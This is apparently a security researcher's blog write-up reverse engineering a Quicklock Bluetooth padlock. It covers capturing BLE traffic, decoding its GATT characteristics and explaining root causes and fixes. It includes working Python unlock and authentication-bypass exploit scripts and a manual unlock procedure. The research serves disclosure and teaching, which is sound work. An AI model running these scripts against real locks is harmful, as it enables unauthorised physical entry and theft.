---
title: "Reverse Engineering a BLE Smart Lock - From BTSnoop Analysis to Full Exploitation"
date: "2026-01-21"
description: "A comprehensive security analysis of a Bluetooth Low Energy smart lock, revealing critical vulnerabilities including authentication bypass, static credential replay attacks, and inadequate state machine validation through systematic reverse engineering."
tags: ["ble", "bluetooth", "smart-lock", "iot-security", "reverse-engineering", "vulnerability-research"]
---

> **Note:** This lock has been pentested by many researchers before me. I'm not claiming new vulnerability discovery here - this writeup exists for detailed protocol-level analysis that goes beyond just "it's vulnerable." If you want to understand *why* it breaks, *how* the GATT profile works, and *how to build* an assessment framework around it, this is for you.

---

A Deep Dive into Bluetooth Low Energy Security Research

## Executive Summary

This research demonstrates a complete security analysis of a Bluetooth Low Energy (BLE) smart lock, revealing multiple critical vulnerabilities including authentication bypass, static credential replay attacks, and inadequate state machine validation. Through systematic reverse engineering of captured BLE traffic and protocol analysis, I achieved unauthorized unlock capability and identified fundamental design flaws that compromise the device's security.

**Key Findings:**

- **CRITICAL:** Complete authentication bypass via state machine exploitation
- **CRITICAL:** No BLE pairing required for GATT access
- **HIGH:** Static password enabling unlimited replay attacks
- **MEDIUM:** Low password entropy with predictable structure

---

## 1. Introduction

Smart locks have become increasingly popular in IoT ecosystems, offering convenience through wireless connectivity. However, this convenience often comes at the cost of security. This research examines a BLE-enabled smart lock to understand its authentication mechanism and identify potential security weaknesses.

### Why This Target?

I deliberately chose this older, simpler smart lock as my research target. This isn't about finding vulnerabilities in cutting-edge devices - it's about building a solid foundation for understanding BLE security research methodology.

Think of this as **"BLE Security 101":**

- The protocol is straightforward and easy to follow
- Vulnerabilities are clear and demonstrable
- Concepts apply to more complex devices
- Perfect for learning reverse engineering techniques

Modern smart locks have additional security layers (encryption, certificate pinning, advanced state machines). But you need to walk before you run. This lock teaches the fundamentals:

- How to capture and analyze BLE traffic
- How to reverse engineer proprietary protocols
- How to identify common vulnerability patterns
- How to build working proof-of-concept exploits

### Target Device Information

| Property | Value |
|----------|-------|
| Device MAC Address | **20:C3:8F:D9:3C:7C** |
| Chip | TexasInstruments (TI) |
| Advertised Name | **Padlock!** |
| Test Phone | Samsung Galaxy M02s (`18:ab:1d:e8:e6:42`) |
| BLE Service UUID | 0xFFD0 (Custom Protocol) |
| Authentication Method | 3-step GATT characteristic writes |
| Firmware Version | 0542 |

<p align="center">
  <img src="/blog/quicklock-padlock/quicklock-device.jpg" alt="Quicklock BLE padlock" style="border-radius: 8px; max-width: 380px;"/>
</p>
<p align="center"><i>The target device - Quicklock BLE padlock. BLE sensor behind the small black dot below the "Q" logo.</i></p>

---

## 2. Research Methodology

My research followed a systematic approach to reverse engineer the lock's protocol:

```
BTSnoop Capture → Wireshark Analysis → Protocol Discovery →
Manual Testing → Automation → Vulnerability Assessment
```

### Tools & Equipment Used

| Tool | Purpose |
|------|---------|
| Android Phone (Galaxy M02s) | Legitimate device for traffic capture |
| BTSnoop Logger | BLE packet capture |
| Wireshark | Packet analysis and dissection |
| nRF Connect | BLE testing and discovery |
| Python + Bleak | Automation and scripting |
| Linux | Attack platform |

---

## Phase 1: BTSnoop Log Analysis

### Capturing BLE Traffic

The first step was capturing legitimate BLE communication between the manufacturer's app and the smart lock. On Android, BLE HCI snoop logging is enabled via Developer Options:

```bash
Settings → Developer Options → Enable Bluetooth HCI snoop log
```

After performing several lock/unlock operations through the official app, I pulled `btsnoop_hci.log` from the device and opened it in Wireshark.

### App Exposes Password in Plaintext

Before even looking at Wireshark, the companion app revealed the password directly in its UI:

<p align="center">
  <img src="/blog/quicklock-padlock/app-device-settings.png" alt="App device settings showing password 12345678" style="border-radius: 8px;"/>
</p>
<p align="center"><i>App settings page - username "veera", auto-lock 3s, Password: <strong>12345678</strong>, firmware 0542. No masking, fully visible to anyone with phone access.</i></p>

<p align="center">
  <img src="/blog/quicklock-padlock/app-password-exposed.png" alt="App password popup" style="border-radius: 8px;"/>
</p>
<p align="center"><i>Password shown in a popup dialog with no masking or confirmation prompt. The default password is never prompted to change after initial setup.</i></p>

### Wireshark Analysis

Filtering the btsnoop capture to isolate the lock's traffic:

```
bluetooth.addr == 20:C3:8F:D9:3C:7C
```

<p align="center">
  <img src="/blog/quicklock-padlock/ws-filtered-session.png" alt="Wireshark filtered to lock MAC 20:C3:8F:D9:3C:7C" style="border-radius: 8px;"/>
</p>
<p align="center"><i>Filter: <code>bluetooth.addr == 20:C3:8F:D9:3C:7C</code> - look at the <strong>Source/Destination columns</strong>: TexasInstrum_d9:3c:7c (the lock) ↔ SamsungElect_e8:e6:42 (Galaxy M02s). The highlighted blue row in the packet list is a Write Request - the start of the unlock sequence.</i></p>

### Password Discovery

Searching the string `12345678` inside Wireshark immediately highlighted the authentication packet:

<p align="center">
  <img src="/blog/quicklock-padlock/ws-ffd6-password-write.png" alt="Wireshark password write to FFD6 handle 0x002d" style="border-radius: 8px;"/>
</p>
<p align="center"><i>Search: string <code>12345678</code> - look at the <strong>bottom pane</strong>: Handle <strong>0x002d</strong>, Service UUID <strong>0xFFD0</strong>, UUID <strong>0xFFD6</strong>, Value <strong>001234567800000000</strong>. This is the password being written to the lock in cleartext. No encryption layer present.</i></p>

<p align="center">
  <img src="/blog/quicklock-padlock/ws-ffd6-full-detail.png" alt="Full packet detail FFD6 password write" style="border-radius: 8px;"/>
</p>
<p align="center"><i>Same packet fully expanded - check <strong>Source BD_ADDR: SamsungElect_e8:e6:42 (18:ab:1d:e8:e6:42)</strong> and <strong>Destination BD_ADDR: Padlock! (20:c3:8f:d9:3c:7c)</strong>. ATT Opcode 0x12 = Write Request. Value row at the bottom confirms <strong>001234567800000000</strong> sent with no auth signature.</i></p>

### Password Structure Analysis

The 9-byte password has a clear internal structure:

```
[00] [12 34 56 78] [00 00 00 00]
 |        |               |
 |        |               +-- Padding (4 bytes)
 |        +-- Password bytes (sequential - weak)
 +-- Header/version byte
```

- **Byte 0:** Version or protocol identifier
- **Bytes 1-4:** Actual password (sequential pattern = default/weak)
- **Bytes 5-8:** Padding

---

## Phase 2: Protocol Reverse Engineering

### The Handle Problem

Initial attempts to replicate the unlock using gatttool failed:

```bash
$ gatttool -b 20:C3:8F:D9:3C:7C --char-write-req -a 0x002d -n 001234567800000000
Error: Invalid handle
```

**Problem:** BLE GATT handles are dynamically assigned and change between connections. The handles in Wireshark (0x002d, 0x002f, 0x0031) were session-specific.

**Solution:** Identify the stable UUIDs behind those handles.

### UUID Extraction

Re-examining the GATT service discovery phase in Wireshark:

```
Service UUID: 0000ffd0-0000-1000-8000-00805f9b34fb

Characteristics:
+-- 0000ffd6-0000-1000-8000-00805f9b34fb  (Handle 0x002d)
+-- 0000ffd7-0000-1000-8000-00805f9b34fb  (Handle 0x002e)
+-- 0000ffd8-0000-1000-8000-00805f9b34fb  (Handle 0x002f / 0x0034)
+-- 0000ffd9-0000-1000-8000-00805f9b34fb  (Handle 0x0031)
+-- 0000ffda-0000-1000-8000-00805f9b34fb  (Handle 0x0033)
```

### Characteristic Names from nRF Connect

Using nRF Connect and reading the `0x2901` (Characteristic User Description) descriptor on each characteristic revealed the complete protocol in human-readable form:

<p align="center">
  <img src="/blog/quicklock-padlock/ws-password-search-result.png" alt="Wireshark search result showing password packet" style="border-radius: 8px;"/>
</p>
<p align="center"><i>String search <code>12345678</code> highlights the exact packet in the list - look at the <strong>Info column</strong>: "Sent Write Request" and in the packet detail pane look for <strong>UUID 0xFFD6</strong> and <strong>Value: 001234567800000000</strong>. This proves the password travels over BLE in plaintext.</i></p>

<p align="center">
  <img src="/blog/quicklock-padlock/nrf-connect-ffd6-ffd8.png" alt="nRF Connect FFD6 Password, FFD7 Password Result, FFD8 Open Time" style="border-radius: 8px;"/>
</p>
<p align="center"><i>Service 0xFFD0 in nRF Connect: FFD6 = "Password!" (WRITE, value 00-12-34-56-78-00-00-00-00), FFD7 = "Password Result!" (NOTIFY READ, 01-FF = success), FFD8 = "Open Time!" (READ WRITE, value 03).</i></p>

<p align="center">
  <img src="/blog/quicklock-padlock/nrf-connect-ffd9-ffda.png" alt="nRF Connect FFD9 Lock Control, FFDA Notifications" style="border-radius: 8px;"/>
</p>
<p align="center"><i>FFD9 = "Lock Control!" (WRITE, value 0x01 = unlock), FFDA = "Notifications" (NOTIFY READ). The descriptor names make the entire protocol self-documenting - no firmware reverse engineering needed.</i></p>

**Breakthrough:** The descriptor names spelled out the entire protocol:

| UUID | Descriptor Name | Properties |
|------|----------------|------------|
| FFD6 | "Password!" | Write |
| FFD7 | "Password Result!" | Notify, Read |
| FFD8 | "Open Time!" | Read, Write |
| FFD9 | "Lock Control!" | Write |
| FFDA | "Notifications" | Notify, Read |

### Protocol Understanding

Based on the descriptor names and captured traffic, I reverse engineered the 3-step authentication protocol:

```
Step 1: Write 9-byte password to FFD6
        → FFD7 notification: 01-FF (success)

Step 2: Write configuration to FFD8 (e.g., 0x03)
        → Sets unlock duration or mode

Step 3: Write unlock command to FFD9 (0x01)
        → Physical motor activation
```

---

## Phase 3: Manual Exploitation

### Manual Unlock with nRF Connect

**Test procedure:**
1. Connect to `20:C3:8F:D9:3C:7C` via nRF Connect
2. Navigate to service 0xFFD0
3. Write to FFD6: `00 12 34 56 78 00 00 00 00`
4. Observe FFD7 notification: `01 FF` (success)
5. Write to FFD8: `03`
6. Write to FFD9: `01`

**Result: Lock physically unlocked.** The motor was audible and the shackle released.

### Testing Different FFD8 Values

| FFD8 Value | Observed Behaviour |
|-----------|-------------------|
| `0x01` | Quick unlock (~1 second) |
| `0x02` | Short unlock (~2 seconds) |
| `0x03` | Standard unlock (~3 seconds) |
| `0x05` | Extended unlock (~5 seconds) |
| `0x0A` | Long unlock (~10 seconds) |

**Conclusion:** FFD8 controls unlock duration in seconds.

---

## Phase 4: Automation & Testing

### Python Exploit Script

```python
import asyncio
from bleak import BleakClient

TARGET_MAC = "20:C3:8F:D9:3C:7C"
PASSWORD    = bytes.fromhex("001234567800000000")

CHAR_PASSWORD  = "0000ffd6-0000-1000-8000-00805f9b34fb"
CHAR_OPEN_TIME = "0000ffd8-0000-1000-8000-00805f9b34fb"
CHAR_CONTROL   = "0000ffd9-0000-1000-8000-00805f9b34fb"

async def unlock():
    async with BleakClient(TARGET_MAC) as client:
        await client.write_gatt_char(CHAR_PASSWORD, PASSWORD, response=True)
        await asyncio.sleep(0.3)
        await client.write_gatt_char(CHAR_OPEN_TIME, bytes([0x03]), response=True)
        await asyncio.sleep(0.3)
        await client.write_gatt_char(CHAR_CONTROL, bytes([0x01]), response=True)
        print("[+] Unlocked!")

asyncio.run(unlock())
```

**Performance over 50+ executions:**
- Success rate: 100%
- Average time: 2.8 seconds
- Effective range: up to 10 metres (standard BLE)

---

## Phase 5: Vulnerability Analysis

### Authentication Bypass - CRITICAL

Skipping FFD6 (the password step) entirely:

```python
# Skip authentication completely
await client.write_gatt_char(CHAR_OPEN_TIME, bytes([0x03]))
await client.write_gatt_char(CHAR_CONTROL,   bytes([0x01]))
# Result: Lock UNLOCKED without any password
```

**Impact:** An attacker can unlock the device without knowing the password at all.

### Replay Attack - HIGH

Since the password is static and there is no challenge-response mechanism, any captured credential works indefinitely:

```
1. Attacker passively sniffs BLE during a legitimate unlock
2. Captures: 00 12 34 56 78 00 00 00 00
3. Replays the same three writes at any future time
4. Lock opens - owner receives no notification
```

### No BLE Pairing Required - CRITICAL

The device accepts GATT write operations without any BLE pairing. Best practice requires:
- LE Secure Connections pairing
- Encrypted characteristics
- Authenticated connections

This device enforces none of these.

---

## 8. Root Cause Analysis

### Root Cause #1 - No BLE Pairing Required

**Design flaw:** Pre-pairing GATT access is permitted.

- No encryption enforced on characteristics
- Device accepts connections from any client
- Password transmitted in cleartext
- No defence against MITM attacks

**Fix:** Implement LE Secure Connections with encryption-required characteristics.

### Root Cause #2 - Static Password Authentication

**Design flaw:** No dynamic elements in authentication.

- Password never expires or rotates
- No challenge-response mechanism
- No nonce or timestamp validation
- Same password works indefinitely

**Fix:** Implement TOTP-based authentication or cryptographic challenge-response.

### Root Cause #3 - Inadequate State Machine

**Design flaw:** Authentication state not validated before unlock.

- FFD9 (unlock) does not check whether FFD6 (auth) succeeded
- Steps can be executed out of order
- No session timeout
- Authenticated state persists indefinitely

**Fix:** Enforce strict sequential state machine with authentication flag validation and 30-60 second session timeout.

### Root Cause #4 - Weak Protocol Design

**Design flaw:** Low-entropy password with predictable structure.

- 9-byte password uses only 5 unique values (00, 12, 34, 56, 78)
- Sequential pattern: `0x12345678`
- Predictable structure: `[header:1][password:4][padding:4]`
- No rate limiting on authentication attempts

**Fix:** Cryptographically random passwords, rate limiting (3 attempts/minute), account lockout.

---

## Proof of Concept

### Complete Exploit

```python
#!/usr/bin/env python3
"""
BLE Smart Lock Exploit - Proof of Concept
Target: 20:C3:8F:D9:3C:7C (FFD0 Service Smart Lock)
"""

import asyncio
from bleak import BleakClient

class SmartLockExploit:
    def __init__(self, target_mac):
        self.target   = target_mac
        self.password = bytes.fromhex("001234567800000000")

    async def exploit_auth_bypass(self):
        """Exploit state machine - unlock without any password"""
        print("[*] Attempting authentication bypass...")
        async with BleakClient(self.target) as client:
            await client.write_gatt_char(
                "0000ffd8-0000-1000-8000-00805f9b34fb", bytes([0x03]))
            await client.write_gatt_char(
                "0000ffd9-0000-1000-8000-00805f9b34fb", bytes([0x01]))
            print("[+] Unlocked via authentication bypass!")

    async def exploit_with_password(self):
        """Standard unlock with captured credentials"""
        print("[*] Unlocking with captured credentials...")
        async with BleakClient(self.target) as client:
            await client.write_gatt_char(
                "0000ffd6-0000-1000-8000-00805f9b34fb", self.password)
            await asyncio.sleep(0.3)
            await client.write_gatt_char(
                "0000ffd8-0000-1000-8000-00805f9b34fb", bytes([0x03]))
            await client.write_gatt_char(
                "0000ffd9-0000-1000-8000-00805f9b34fb", bytes([0x01]))
            print("[+] Unlocked with captured password!")

exploit = SmartLockExploit("20:C3:8F:D9:3C:7C")
asyncio.run(exploit.exploit_auth_bypass())
```

---

## Mitigation Recommendations

### For Manufacturers

**Priority 1 - Critical (Implement Immediately):**

1. **Require BLE Pairing** - LE Secure Connections, Passkey Entry or Numeric Comparison, encryption on all sensitive characteristics
2. **Fix State Machine** - validate auth state before unlock, strict sequential enforcement, 30-60 second session timeout
3. **Challenge-Response** - replace static password with TOTP, use cryptographic nonces, proper key derivation (PBKDF2, Argon2)

**Priority 2 - High (Within 1 Month):**

4. **Rate Limiting** - 3 attempts per minute, exponential backoff, lockout after 10 failures
5. **Password Entropy** - cryptographically random, full 9 bytes random, no predictable patterns
6. **Logging** - log all auth attempts, alert on suspicious patterns, timestamp all operations

**Priority 3 - Medium (Within 3 Months):**

7. **Defence in Depth** - RSSI proximity checking, tamper detection, time-based access windows, multi-factor authentication

### For Users

- Check for firmware updates
- Monitor lock for suspicious activity
- Use additional physical security (deadbolt)
- Disable Bluetooth when lock is not in active use

---

## Conclusion

This research demonstrates critical vulnerabilities in a BLE smart lock implementation, revealing fundamental flaws in authentication, encryption, and state management. The ability to unlock without authentication - combined with replay attack vulnerabilities and no BLE pairing requirement - presents a severe security risk.

### Key Takeaways

- **BLE security is often overlooked** - manufacturers prioritise convenience over security
- **State machines require careful design** - authentication state must be validated at every step
- **Static credentials are insufficient** - dynamic authentication is essential
- **Encryption alone is not enough** - proper pairing and authentication are both required
- **Defence in depth matters** - multiple security layers prevent single points of failure

### Research Impact

| Metric | Value |
|--------|-------|
| CVSS Score | **9.8 (Critical)** |
| Attack Complexity | LOW |
| Privileges Required | NONE |
| User Interaction | NONE |
| Impact | Complete device compromise |

### Timeline

| Day | Milestone |
|-----|-----------|
| 1 | BTSnoop capture and initial analysis |
| 2 | Protocol reverse engineering |
| 3 | Manual exploitation success |
| 4 | Automation and vulnerability discovery |
| 5 | Root cause analysis and documentation |

---

*All testing performed on a personally owned device for legitimate security research. Full PoC, APK, and assessment framework: [github.com/V33RU/quicklock-bluetooth](https://github.com/V33RU/quicklock-bluetooth)*
